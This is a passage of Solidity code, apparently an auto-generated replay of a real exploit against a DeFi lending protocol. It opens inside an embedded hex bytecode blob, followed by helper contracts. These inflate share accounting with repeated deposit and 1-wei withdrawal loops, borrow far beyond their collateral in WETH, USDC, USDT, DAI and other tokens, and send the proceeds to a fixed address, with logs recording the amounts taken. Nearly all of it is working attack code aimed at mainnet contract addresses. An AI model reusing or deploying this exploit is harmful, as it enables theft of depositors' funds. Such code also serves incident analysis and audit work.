            hex"ffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a0",
            hex"8231306040518263ffffffff1660e01b8152600401611b1b919061201b565b60",
            hex"2060405180830381865afa158015611b38573d6000803e3d6000fd5b50505050",
            hex"6040513d601f19601f82011682018060405250810190611b5c9190612267565b",
            hex"6040518363ffffffff1660e01b8152600401611b79929190611ff2565b600060",
            hex"405180830381600087803b158015611b9357600080fd5b505af1158015611ba7",
            hex"573d6000803e3d6000fd5b505050505b60008054906101000a900473ffffffff",
            hex"ffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffff",
            hex"ffffffffffff1663a9059cbb3360008054906101000a900473ffffffffffffff",
            hex"ffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffff",
            hex"ffffff166370a08231306040518263ffffffff1660e01b8152600401611c4291",
            hex"9061201b565b602060405180830381865afa158015611c5f573d6000803e3d60",
            hex"00fd5b505050506040513d601f19601f82011682018060405250810190611c83",
            hex"9190612267565b6040518363ffffffff1660e01b8152600401611ca092919061",
            hex"1ff2565b600060405180830381600087803b158015611cba57600080fd5b505a",
            hex"f1158015611cce573d6000803e3d6000fd5b50505050611db8565b6007600090",
            hex"54906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ff",
            hex"ffffffffffffffffffffffffffffffffffffff1663c7c5c4a7600a5460086000",
            hex"9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1667",
            hex"4563918244f400006004600387611d539190612310565b611d5d91906121cb56",
            hex"5b611d679190612352565b6040518463ffffffff1660e01b8152600401611d85",
            hex"93929190612230565b600060405180830381600087803b158015611d9f576000",
            hex"80fd5b505af1158015611db3573d6000803e3d6000fd5b505050505b5b50565b",
            hex"6000604051905090565b600080fd5b600080fd5b600073ffffffffffffffffff",
            hex"ffffffffffffffffffffff82169050919050565b6000611dfb82611dd0565b90",
            hex"50919050565b611e0b81611df0565b8114611e1657600080fd5b50565b600081",
            hex"359050611e2881611e02565b92915050565b6000819050919050565b611e4181",
            hex"611e2e565b8114611e4c57600080fd5b50565b600081359050611e5e81611e38",
            hex"565b92915050565b600080fd5b600080fd5b600080fd5b60008083601f840112",
            hex"611e8957611e88611e64565b5b8235905067ffffffffffffffff811115611ea6",
            hex"57611ea5611e69565b5b602083019150836001820283011115611ec257611ec1",
            hex"611e6e565b5b9250929050565b600080600080600060808688031215611ee557",
            hex"611ee4611dc6565b5b6000611ef388828901611e19565b9550506020611f0488",
            hex"828901611e19565b9450506040611f1588828901611e4f565b93505060608601",
            hex"3567ffffffffffffffff811115611f3657611f35611dcb565b5b611f42888289",
            hex"01611e73565b92509250509295509295909350565b60007fffffffff00000000",
            hex"0000000000000000000000000000000000000000000000008216905091905056",
            hex"5b611f8681611f51565b82525050565b6000602082019050611fa16000830184",
            hex"611f7d565b92915050565b600060208284031215611fbd57611fbc611dc6565b",
            hex"5b6000611fcb84828501611e19565b91505092915050565b611fdd81611df056",
            hex"5b82525050565b611fec81611e2e565b82525050565b60006040820190506120",
            hex"076000830185611fd4565b6120146020830184611fe3565b9392505050565b60",
            hex"006020820190506120306000830184611fd4565b92915050565b600080fd5b60",
            hex"00601f19601f8301169050919050565b7f4e487b710000000000000000000000",
            hex"0000000000000000000000000000000000600052604160045260246000fd5b61",
            hex"20848261203b565b810181811067ffffffffffffffff821117156120a3576120",
            hex"a261204c565b5b80604052505050565b60006120b6611dbc565b90506120c282",
            hex"8261207b565b919050565b6000815190506120d681611e38565b92915050565b",
            hex"6000606082840312156120f2576120f1612036565b5b6120fc60606120ac565b",
            hex"9050600061210c848285016120c7565b60008301525060206121208482850161",
            hex"20c7565b6020830152506040612134848285016120c7565b6040830152509291",
            hex"5050565b60006060828403121561215657612155611dc6565b5b600061216484",
            hex"8285016120dc565b91505092915050565b7f4e487b7100000000000000000000",
            hex"000000000000000000000000000000000000600052601260045260246000fd5b",
            hex"7f4e487b71000000000000000000000000000000000000000000000000000000",
            hex"00600052601160045260246000fd5b60006121d682611e2e565b91506121e183",
            hex"611e2e565b9250826121f1576121f061216d565b5b828204905092915050565b",
            hex"600061220782611e2e565b915061221283611e2e565b92508282019050808211",
            hex"1561222a5761222961219c565b5b92915050565b600060608201905061224560",
            hex"00830186611fe3565b6122526020830185611fd4565b61225f6040830184611f",
            hex"e3565b949350505050565b60006020828403121561227d5761227c611dc6565b",
            hex"5b600061228b848285016120c7565b91505092915050565b6000819050919050",
            hex"565b6000819050919050565b60006122c36122be6122b984612294565b61229e",
            hex"565b611e2e565b9050919050565b6122d3816122a8565b82525050565b600060",
            hex"60820190506122ee6000830186611fe3565b6122fb6020830185611fd4565b61",
            hex"230860408301846122ca565b949350505050565b600061231b82611e2e565b91",
            hex"5061232683611e2e565b925082820261233481611e2e565b9150828204841483",
            hex"151761234b5761234a61219c565b5b5092915050565b600061235d82611e2e56",
            hex"5b915061236883611e2e565b92508282039050818111156123805761237f6121",
            hex"9c565b5b9291505056fea2646970667358221220367c5f2eb38952a59e56bca5",
            hex"c43973b8e2f76ca7340d15b0c979a210150ebdee64736f6c63430008120033a2",
            hex"646970667358221220414e944773a1cd55d10b4e241180c3d54ac27f2c171ebd",
            abi.encode(address(0xaf6b47055A73ab897c64736F6C63430008120033))
        );
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    fallback() external payable {
        bytes4 selector = bytes4(msg.data);
        if (selector == 0x4abcd4e9) {
            x4abcd4e9();
            return;
        }
        revert("no such function");
    }
}

contract X51ff {
    address immutable r = address(this);
    receive() external payable {}
    address constant x32e0 = 0x32E0A7F7C4b1A19594d25bD9b63EBA912b1a5f61;
    address constant x37e4 = 0x37e49bf3749513A02FA535F0CbC383796E8107E4;
    address constant x636f = 0x000000000000000000636F6e736F6c652e6c6f67;
    address constant x7f39 = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant xb40b = 0xB40b073d7E47986D3A45Ca7Fd30772C25A2AD57f;

    address x91c4;

    constructor(address a_x91c4) payable {
        x91c4 = a_x91c4; // 0x91c49Cc7FBfE8f70AceEb075952cD64817f9d82c
        I(x32e0).mintPosition();
    }

    function borrow() public {
        I(xb40b).approve(x37e4, type(uint256).max);
        I(x37e4).lendingPoolData(xb40b);
        I(x37e4).depositExactAmount(11, xb40b, 47638199349774088374);
        I(x37e4).getTotalPool(x7f39);
        I(x37e4).getTotalPool(x7f39);
        I(x37e4).getTotalPool(x7f39);
        I(x37e4).borrowExactAmount(11, xb40b, 23443463776915873010);
        I(x37e4).getTotalPool(x7f39);
        I(x37e4).borrowExactAmount(11, x7f39, 10278911665897160027);
        // uint256 v1 = 10278911665897160027;
        uint256 v1 = I(x7f39).balanceOf(r);
        console2.log("I(x7f39).balanceOf(r)\t\t->", "10278911665897160027 (10.2789 ether)");
        I(x7f39).transfer(x91c4, v1);
        I(x37e4).withdrawExactAmount(11, xb40b, 1);
        // uint256 v2 = 23443463776915873011;
        uint256 v2 = I(xb40b).balanceOf(r);
        console2.log("I(xb40b).balanceOf(r)\t\t->", "23443463776915873011 (23.4434 ether)");
        I(xb40b).transfer(x91c4, v2);
    }

    fallback() external payable {
        revert("no such function");
    }
}

contract X3a0e {
    address immutable r = address(this);
    receive() external payable {}
    address constant x32e0 = 0x32E0A7F7C4b1A19594d25bD9b63EBA912b1a5f61;
    address constant x37e4 = 0x37e49bf3749513A02FA535F0CbC383796E8107E4;
    address constant x636f = 0x000000000000000000636F6e736F6c652e6c6f67;
    address constant x7f39 = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant xb40b = 0xB40b073d7E47986D3A45Ca7Fd30772C25A2AD57f;

    address x91c4;

    constructor(address a_x91c4) payable {
        x91c4 = a_x91c4; // 0x91c49Cc7FBfE8f70AceEb075952cD64817f9d82c
        I(x32e0).mintPosition();
    }

    function borrow() public {
        I(xb40b).approve(x37e4, type(uint256).max);
        I(x37e4).lendingPoolData(xb40b);
        I(x37e4).depositExactAmount(9, xb40b, 36472996377170786411);
        I(x37e4).getTotalPool(x7f39);
        I(x37e4).getTotalPool(x7f39);
        I(x37e4).borrowExactAmount(9, x7f39, 43767595652604943692);
        // uint256 v1 = 43767595652604943692;
        uint256 v1 = I(x7f39).balanceOf(r);
        console2.log("I(x7f39).balanceOf(r)\t\t->", "43767595652604943692 (43.7675 ether)");
        I(x7f39).transfer(x91c4, v1);
        I(x37e4).withdrawExactAmount(9, xb40b, 1);
        // uint256 v2 = 1;
        uint256 v2 = I(xb40b).balanceOf(r);
        console2.log("I(xb40b).balanceOf(r)\t\t->", uint256(1));
        I(xb40b).transfer(x91c4, v2);
    }

    fallback() external payable {
        revert("no such function");
    }
}

contract X0307 {
    address immutable r = address(this);
    receive() external payable {}
    address constant x32e0 = 0x32E0A7F7C4b1A19594d25bD9b63EBA912b1a5f61;
    address constant x37e4 = 0x37e49bf3749513A02FA535F0CbC383796E8107E4;
    address constant x636f = 0x000000000000000000636F6e736F6c652e6c6f67;
    address constant x6b17 = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address constant x7f39 = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant xa0b8 = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant xb40b = 0xB40b073d7E47986D3A45Ca7Fd30772C25A2AD57f;
    address constant xc02a = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant xdac1 = 0xdAC17F958D2ee523a2206206994597C13D831ec7;

    address x91c4;

    constructor(address a_x91c4) payable {
        x91c4 = a_x91c4; // 0x91c49Cc7FBfE8f70AceEb075952cD64817f9d82c
        I(x32e0).mintPosition();
    }

    function borrow() public {
        I(xb40b).approve(x37e4, type(uint256).max);
        I(x37e4).lendingPoolData(xb40b);
        I(x37e4).depositExactAmount(13, xb40b, 62221321599704931753);
        I(x37e4).getTotalPool(x7f39);
        I(x37e4).getTotalPool(xc02a);
        I(x37e4).getTotalPool(xc02a);
        I(x37e4).getTotalPool(xc02a);
        I(x37e4).borrowExactAmount(13, xb40b, 27742814258725671652);
        I(x37e4).getTotalPool(xc02a);
        I(x37e4).borrowExactAmount(13, xc02a, 18513155642150314561);
        I(x37e4).getTotalPool(xa0b8);
        I(x37e4).borrowExactAmount(13, xa0b8, 9000000000);
        I(x37e4).getTotalPool(xdac1);
        I(x37e4).borrowExactAmount(13, xdac1, 2000000000);
        I(x37e4).getTotalPool(x6b17);
        I(x37e4).borrowExactAmount(13, x6b17, 5000000000000000000000);
        // uint256 v1 = 9000000000;
        uint256 v1 = I(xa0b8).balanceOf(r);
        console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(9000000000));
        I(xa0b8).transfer(x91c4, v1);
        // uint256 v2 = 2000000000;
        uint256 v2 = I(xdac1).balanceOf(r);
        console2.log("I(xdac1).balanceOf(r)\t\t->", uint256(2000000000));
        I(xdac1).transfer(x91c4, v2);
        // uint256 v3 = 5000000000000000000000;
        uint256 v3 = I(x6b17).balanceOf(r);
        console2.log("I(x6b17).balanceOf(r)\t\t->", "5000000000000000000000 (5000.0 ether)");
        I(x6b17).transfer(x91c4, v3);
        // uint256 v4 = 18513155642150314561;
        uint256 v4 = I(xc02a).balanceOf(r);
        console2.log("I(xc02a).balanceOf(r)\t\t->", "18513155642150314561 (18.5131 ether)");
        I(xc02a).transfer(x91c4, v4);
        I(x37e4).withdrawExactAmount(13, xb40b, 1);
        // uint256 v5 = 27742814258725671653;
        uint256 v5 = I(xb40b).balanceOf(r);
        console2.log("I(xb40b).balanceOf(r)\t\t->", "27742814258725671653 (27.7428 ether)");
        I(xb40b).transfer(x91c4, v5);
    }

    fallback() external payable {
        revert("no such function");
    }
}

contract X130f {
    address immutable r = address(this);
    receive() external payable {}
    address constant x32e0 = 0x32E0A7F7C4b1A19594d25bD9b63EBA912b1a5f61;
    address constant x37e4 = 0x37e49bf3749513A02FA535F0CbC383796E8107E4;
    address constant x636f = 0x000000000000000000636F6e736F6c652e6c6f67;
    address constant x7f39 = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant xb40b = 0xB40b073d7E47986D3A45Ca7Fd30772C25A2AD57f;
    address constant xc02a = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    address x91c4;

    constructor(address a_x91c4) payable {
        x91c4 = a_x91c4; // 0x91c49Cc7FBfE8f70AceEb075952cD64817f9d82c
        I(x32e0).mintPosition();
    }

    function borrow() public {
        I(xb40b).approve(x37e4, type(uint256).max);
        I(x37e4).lendingPoolData(xb40b);
        I(x37e4).depositExactAmount(14, xb40b, 71110081828234207718);
        I(x37e4).getTotalPool(x7f39);
        I(x37e4).getTotalPool(xc02a);
        I(x37e4).borrowExactAmount(14, xb40b, 48332561371175655788);
        I(x37e4).withdrawExactAmount(14, xb40b, 1);
        // uint256 v1 = 48332561371175655789;
        uint256 v1 = I(xb40b).balanceOf(r);
        console2.log("I(xb40b).balanceOf(r)\t\t->", "48332561371175655789 (48.3325 ether)");
        I(xb40b).transfer(x91c4, v1);
    }

    fallback() external payable {
        revert("no such function");
    }
}

contract Xd68e {
    address immutable r = address(this);
    receive() external payable {}
    address constant x32e0 = 0x32E0A7F7C4b1A19594d25bD9b63EBA912b1a5f61;
    address constant x37e4 = 0x37e49bf3749513A02FA535F0CbC383796E8107E4;
    address constant x636f = 0x000000000000000000636F6e736F6c652e6c6f67;
    address constant x7f39 = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant xb40b = 0xB40b073d7E47986D3A45Ca7Fd30772C25A2AD57f;

    address x91c4;

    constructor(address a_x91c4) payable {
        x91c4 = a_x91c4; // 0x91c49Cc7FBfE8f70AceEb075952cD64817f9d82c
        I(x32e0).mintPosition();
    }

    function borrow() public {
        I(xb40b).approve(x37e4, type(uint256).max);
        I(x37e4).lendingPoolData(xb40b);
        I(x37e4).depositExactAmount(10, xb40b, 41683424431052327327);
        I(x37e4).getTotalPool(x7f39);
        I(x37e4).getTotalPool(x7f39);
        I(x37e4).borrowExactAmount(10, x7f39, 50020109317262792792);
        // uint256 v1 = 50020109317262792792;
        uint256 v1 = I(x7f39).balanceOf(r);
        console2.log("I(x7f39).balanceOf(r)\t\t->", "50020109317262792792 (50.2010 ether)");
        I(x7f39).transfer(x91c4, v1);
        I(x37e4).withdrawExactAmount(10, xb40b, 1);
        // uint256 v2 = 1;
        uint256 v2 = I(xb40b).balanceOf(r);
        console2.log("I(xb40b).balanceOf(r)\t\t->", uint256(1));
        I(xb40b).transfer(x91c4, v2);
    }

    fallback() external payable {
        revert("no such function");
    }
}

contract X0b1b {
    address immutable r = address(this);
    receive() external payable {}
    address constant x0000 = 0x0000000000000000000000000000000000000000;
    address constant x11b8 = 0x11b815efB8f581194ae79006d24E0d814B7697F6;
    address constant x37e4 = 0x37e49bf3749513A02FA535F0CbC383796E8107E4;
    address constant x4d32 = 0x4D32C8Ff2fACC771eC7Efc70d6A8468bC30C26bF;
    address constant x4f1c = 0x4f1cDF43f5E407abD569878976960d4d0A3d3452;
    address constant x5777 = 0x5777d92f208679DB4b9778590Fa3CAB3aC9e2168;
    address constant x636f = 0x000000000000000000636F6e736F6c652e6c6f67;
    address constant x6b17 = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address constant x88e6 = 0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640;
    address constant x898c = 0x898CA9B3ef8b6a30dA5fc7202f70E7992b3602B3;
    address constant xa0b8 = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant xae7a = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
    address constant xb40b = 0xB40b073d7E47986D3A45Ca7Fd30772C25A2AD57f;
    address constant xc02a = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant xc374 = 0xC374f7eC85F8C7DE3207a10bB1978bA104bdA3B2;
    address constant xdac1 = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant xdc24 = 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022;

    address x91c4;

    constructor(address a_x91c4) payable {
        x91c4 = a_x91c4; // 0x91c49Cc7FBfE8f70AceEb075952cD64817f9d82c
    }

    function x41ad6f20() public {
        // uint256 v1 = 80095215596146371732;
        uint256 v1 = I(xae7a).balanceOf(x91c4);
        console2.log("I(xae7a).balanceOf(x91c4)\t->", "80095215596146371732 (80.9521 ether)");
        // uint256 v2 = 92012091781801765194;
        uint256 v2 = I(xc02a).balanceOf(x91c4);
        console2.log("I(xc02a).balanceOf(x91c4)\t->", "92012091781801765194 (92.1209 ether)");
        // uint256 v3 = 9000000000;
        uint256 v3 = I(xa0b8).balanceOf(x91c4);
        console2.log("I(xa0b8).balanceOf(x91c4)\t->", uint256(9000000000));
        // uint256 v4 = 2000000000;
        uint256 v4 = I(xdac1).balanceOf(x91c4);
        console2.log("I(xdac1).balanceOf(x91c4)\t->", uint256(2000000000));
        // uint256 v5 = 5000000000000000000000;
        uint256 v5 = I(x6b17).balanceOf(x91c4);
        console2.log("I(x6b17).balanceOf(x91c4)\t->", "5000000000000000000000 (5000.0 ether)");
        I(xae7a).approve(xdc24, type(uint256).max);
        I(xdc24).exchange(1, 0, v1, 60000000000000000000);
        // address v6 = x6b17;
        address v6 = I(x5777).token0();
        console2.log("I(x5777).token0()\t->", v6);
        // address v7 = xa0b8;
        address v7 = I(x5777).token1();
        console2.log("I(x5777).token1()\t->", v7);
        I(x5777).slot0();
        I(x5777).swap(x91c4, true, 5000000000000000000000, 75266113339224843170095, "");
        // uint256 v8 = 13999414783;
        uint256 v8 = I(xa0b8).balanceOf(x91c4);
        console2.log("I(xa0b8).balanceOf(x91c4)\t->", uint256(13999414783));
        // address v9 = xa0b8;
        address v9 = I(x88e6).token0();
        console2.log("I(x88e6).token0()\t->", v9);
        // address v10 = xc02a;
        address v10 = I(x88e6).token1();
        console2.log("I(x88e6).token1()\t->", v10);
        I(x88e6).slot0();
        I(x88e6).swap(x91c4, true, 13999414783, 1474119056262611960224773696936991, "");
        // address v11 = xc02a;
        address v11 = I(x11b8).token0();
        console2.log("I(x11b8).token0()\t->", v11);
        // address v12 = xdac1;
        address v12 = I(x11b8).token1();
        console2.log("I(x11b8).token1()\t->", v12);
        I(x11b8).slot0();
        I(x11b8).swap(x91c4, false, 2000000000, 4261245927147252176997221, "");
    }

    function xabe51504() public {
        // uint256 v1 = 520539781914590517894;
        uint256 v1 = I(xc374).balanceOf(x91c4);
        console2.log("I(xc374).balanceOf(x91c4)\t->", "520539781914590517894 (520.5397 ether)");
        I(xb40b).depositExactAmount(v1);
        I(x37e4).getPositionLendingShares(8, xb40b);
        I(x37e4).withdrawExactShares(8, xb40b, 10000000000);
        I(x37e4).lendingPoolData(xb40b);
        I(x37e4).depositExactAmount(8, xb40b, 3);
        I(x37e4).withdrawExactAmount(8, xb40b, 1);
        I(x37e4).lendingPoolData(xb40b);
        I(x37e4).depositExactAmount(8, xb40b, 7);
        I(x37e4).withdrawExactAmount(8, xb40b, 1);
        I(x37e4).lendingPoolData(xb40b);
        I(x37e4).depositExactAmount(8, xb40b, 19);
        I(x37e4).withdrawExactAmount(8, xb40b, 1);
        I(x37e4).lendingPoolData(xb40b);
        I(x37e4).depositExactAmount(8, xb40b, 55);
        I(x37e4).withdrawExactAmount(8, xb40b, 1);
        I(x37e4).lendingPoolData(xb40b);
        I(x37e4).depositExactAmount(8, xb40b, 163);
        I(x37e4).withdrawExactAmount(8, xb40b, 1);
        I(x37e4).lendingPoolData(xb40b);
        I(x37e4).depositExactAmount(8, xb40b, 487);
        I(x37e4).withdrawExactAmount(8, xb40b, 1);
        I(x37e4).lendingPoolData(xb40b);
        I(x37e4).depositExactAmount(8, xb40b, 1459);
        I(x37e4).withdrawExactAmount(8, xb40b, 1);
        I(x37e4).lendingPoolData(xb40b);
        I(x37e4).depositExactAmount(8, xb40b, 4375);
        I(x37e4).withdrawExactAmount(8, xb40b, 1);
        I(x37e4).lendingPoolData(xb40b);
        I(x37e4).depositExactAmount(8, xb40b, 13123);
        {
            I(x37e4).withdrawExactAmount(8, xb40b, 1);
            I(x37e4).lendingPoolData(xb40b);
            I(x37e4).depositExactAmount(8, xb40b, 39367);
            I(x37e4).withdrawExactAmount(8, xb40b, 1);
            I(x37e4).lendingPoolData(xb40b);
            I(x37e4).depositExactAmount(8, xb40b, 118099);
            I(x37e4).withdrawExactAmount(8, xb40b, 1);
            I(x37e4).lendingPoolData(xb40b);
            I(x37e4).depositExactAmount(8, xb40b, 354295);
            I(x37e4).withdrawExactAmount(8, xb40b, 1);
            I(x37e4).lendingPoolData(xb40b);
            I(x37e4).depositExactAmount(8, xb40b, 1062883);
            I(x37e4).withdrawExactAmount(8, xb40b, 1);
            I(x37e4).lendingPoolData(xb40b);
            I(x37e4).depositExactAmount(8, xb40b, 3188647);
            I(x37e4).withdrawExactAmount(8, xb40b, 1);
            I(x37e4).lendingPoolData(xb40b);
            I(x37e4).depositExactAmount(8, xb40b, 9565939);
            I(x37e4).withdrawExactAmount(8, xb40b, 1);
            I(x37e4).lendingPoolData(xb40b);
            I(x37e4).depositExactAmount(8, xb40b, 28697815);
            I(x37e4).withdrawExactAmount(8, xb40b, 1);
            I(x37e4).lendingPoolData(xb40b);
            I(x37e4).depositExactAmount(8, xb40b, 86093443);
            I(x37e4).withdrawExactAmount(8, xb40b, 1);
            I(x37e4).lendingPoolData(xb40b);
            I(x37e4).depositExactAmount(8, xb40b, 258280327);
            I(x37e4).withdrawExactAmount(8, xb40b, 1);
            I(x37e4).lendingPoolData(xb40b);
            I(x37e4).depositExactAmount(8, xb40b, 774840979);
        }
        {
            I(x37e4).withdrawExactAmount(8, xb40b, 1);
            I(x37e4).lendingPoolData(xb40b);
            I(x37e4).depositExactAmount(8, xb40b, 2324522935);
            I(x37e4).withdrawExactAmount(8, xb40b, 1);
            I(x37e4).lendingPoolData(xb40b);
            I(x37e4).depositExactAmount(8, xb40b, 6973568803);
            I(x37e4).withdrawExactAmount(8, xb40b, 1);
            I(x37e4).lendingPoolData(xb40b);
            I(x37e4).depositExactAmount(8, xb40b, 20920706407);
            I(x37e4).withdrawExactAmount(8, xb40b, 1);
            I(x37e4).lendingPoolData(xb40b);
            I(x37e4).depositExactAmount(8, xb40b, 62762119219);
            I(x37e4).withdrawExactAmount(8, xb40b, 1);
            I(x37e4).lendingPoolData(xb40b);
            I(x37e4).depositExactAmount(8, xb40b, 188286357655);
            I(x37e4).withdrawExactAmount(8, xb40b, 1);
            I(x37e4).lendingPoolData(xb40b);
            I(x37e4).depositExactAmount(8, xb40b, 564859072963);
            I(x37e4).withdrawExactAmount(8, xb40b, 1);
            I(x37e4).lendingPoolData(xb40b);
            I(x37e4).depositExactAmount(8, xb40b, 1694577218887);
            I(x37e4).withdrawExactAmount(8, xb40b, 1);
            I(x37e4).lendingPoolData(xb40b);
            I(x37e4).depositExactAmount(8, xb40b, 5083731656659);
            I(x37e4).withdrawExactAmount(8, xb40b, 1);
            I(x37e4).lendingPoolData(xb40b);
            I(x37e4).depositExactAmount(8, xb40b, 15251194969975);
            I(x37e4).withdrawExactAmount(8, xb40b, 1);
            I(x37e4).lendingPoolData(xb40b);
            I(x37e4).depositExactAmount(8, xb40b, 45753584909923);
        }
        {
            I(x37e4).withdrawExactAmount(8, xb40b, 1);
            I(x37e4).lendingPoolData(xb40b);
            I(x37e4).depositExactAmount(8, xb40b, 137260754729767);
            I(x37e4).withdrawExactAmount(8, xb40b, 1);
            I(x37e4).lendingPoolData(xb40b);
            I(x37e4).depositExactAmount(8, xb40b, 411782264189299);
            I(x37e4).withdrawExactAmount(8, xb40b, 1);
            I(x37e4).lendingPoolData(xb40b);
            I(x37e4).depositExactAmount(8, xb40b, 1235346792567895);
            I(x37e4).withdrawExactAmount(8, xb40b, 1);
            I(x37e4).lendingPoolData(xb40b);
            I(x37e4).depositExactAmount(8, xb40b, 3706040377703683);
            I(x37e4).withdrawExactAmount(8, xb40b, 1);
            I(x37e4).lendingPoolData(xb40b);
            I(x37e4).depositExactAmount(8, xb40b, 11118121133111047);
            I(x37e4).withdrawExactAmount(8, xb40b, 1);
            I(x37e4).lendingPoolData(xb40b);
            I(x37e4).depositExactAmount(8, xb40b, 33354363399333139);
            I(x37e4).withdrawExactAmount(8, xb40b, 1);
            I(x37e4).lendingPoolData(xb40b);
            I(x37e4).depositExactAmount(8, xb40b, 100063090197999415);
            I(x37e4).withdrawExactAmount(8, xb40b, 1);
            I(x37e4).lendingPoolData(xb40b);
            I(x37e4).depositExactAmount(8, xb40b, 300189270593998243);
            I(x37e4).withdrawExactAmount(8, xb40b, 1);
            I(x37e4).lendingPoolData(xb40b);
            I(x37e4).depositExactAmount(8, xb40b, 900567811781994727);
            I(x37e4).withdrawExactAmount(8, xb40b, 1);
            I(x37e4).lendingPoolData(xb40b);
            I(x37e4).depositExactAmount(8, xb40b, 2701703435345984179);
        }
        {
            I(x37e4).withdrawExactAmount(8, xb40b, 1);
            I(x37e4).lendingPoolData(xb40b);
            I(x37e4).depositExactAmount(8, xb40b, 8105110306037952535);
            I(x37e4).withdrawExactAmount(8, xb40b, 1);
            I(x37e4).lendingPoolData(xb40b);
            I(x37e4).depositExactAmount(8, xb40b, 24315330918113857603);
            I(x37e4).withdrawExactAmount(8, xb40b, 1);
            I(x37e4).lendingPoolData(xb40b);
            I(x37e4).depositExactAmount(8, xb40b, 218837978263024718430);
        }
    }

    function xecf2051e() public {
        S1 memory s105 =
            S1(246086448608286990000, 253505893203061860000, 247323063927927510000, 100, 500000000000000000);
        S3 memory s305 = S3(0, x0000, "", false);
        S2 memory s205 = S2(xae7a, 1110000000000000000000, xae7a, x0000, x0000, s305);
        I(x4f1c).zapIn(6, 0, s105, s205, false);

        // uint256 v1 = 520539781914590517894;
        uint256 v1 = I(x898c).balanceOf(x91c4);
        console2.log("I(x898c).balanceOf(x91c4)\t->", "520539781914590517894 (520.5397 ether)");
        I(x4d32).withdraw(6, v1);
    }

    function x58b9648f() public {
        // uint256 v1 = 518978162578846761602;
        uint256 v1 = I(xb40b).balanceOf(x91c4);
        console2.log("I(xb40b).balanceOf(x91c4)\t->", "518978162578846761602 (518.9781 ether)");
        I(xb40b).withdrawExactShares(v1);
        // uint256 v2 = 518978162578846761602;
        uint256 v2 = I(xc374).balanceOf(x91c4);
        console2.log("I(xc374).balanceOf(x91c4)\t->", "518978162578846761602 (518.9781 ether)");
        I(x4d32).deposit(6, v2, false);

        S3 memory s309 = S3(0, x0000, "", false);
        S2 memory s209 = S2(xae7a, 0, xae7a, x0000, x0000, s309);
        I(x4f1c).zapOut(6, v2, s209, false);
    }

    fallback() external payable {
        revert("no such function");
    }
}

contract X15b9 {
    address immutable r = address(this);
    receive() external payable {}
    address constant x32e0 = 0x32E0A7F7C4b1A19594d25bD9b63EBA912b1a5f61;
    address constant x37e4 = 0x37e49bf3749513A02FA535F0CbC383796E8107E4;
    address constant x636f = 0x000000000000000000636F6e736F6c652e6c6f67;
    address constant x7f39 = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant xb40b = 0xB40b073d7E47986D3A45Ca7Fd30772C25A2AD57f;
    address constant xc02a = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    address x91c4;

    constructor(address a_x91c4) payable {
        x91c4 = a_x91c4; // 0x91c49Cc7FBfE8f70AceEb075952cD64817f9d82c
        I(x32e0).mintPosition();
    }

    function borrow() public {
        I(xb40b).approve(x37e4, type(uint256).max);
        I(x37e4).lendingPoolData(xb40b);
        I(x37e4).depositExactAmount(12, xb40b, 54443656399741815284);
        I(x37e4).getTotalPool(x7f39);
        I(x37e4).getTotalPool(xc02a);
        I(x37e4).getTotalPool(xc02a);
        I(x37e4).borrowExactAmount(12, xc02a, 73498936139651450633);
        // uint256 v1 = 73498936139651450633;
        uint256 v1 = I(xc02a).balanceOf(r);
        console2.log("I(xc02a).balanceOf(r)\t\t->", "73498936139651450633 (73.4989 ether)");
        I(xc02a).transfer(x91c4, v1);
        I(x37e4).withdrawExactAmount(12, xb40b, 1);
        // uint256 v2 = 1;
        uint256 v2 = I(xb40b).balanceOf(r);
        console2.log("I(xb40b).balanceOf(r)\t\t->", uint256(1));
        I(xb40b).transfer(x91c4, v2);
    }

    fallback() external payable {
        revert("no such function");
    }
}
